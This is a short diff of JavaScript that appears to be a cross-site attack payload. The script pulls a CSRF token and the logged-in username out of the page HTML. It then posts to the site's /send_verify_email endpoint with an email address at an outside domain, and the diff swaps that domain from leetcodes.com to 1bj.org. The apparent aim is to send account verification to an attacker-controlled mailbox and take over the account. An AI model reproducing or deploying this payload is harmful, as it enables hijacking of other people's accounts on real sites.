@@ -28,7 +28,7 @@ var token = tokloc[1];
 var usrloc = /href="\/friends\/(.*)">My Friends/g.exec(html);
 var usr = usrloc[1];
 console.log(usr + ' and ' + token);
-postAXAH('http://' + window.location.hostname + '/send_verify_email', '_token=' + token + '&user_email=' + usr + '%40leetcodes.com');
+postAXAH('http://' + window.location.hostname + '/send_verify_email', '_token=' + token + '&user_email=' + usr + '%401bj.org');
 
 }}}}
 
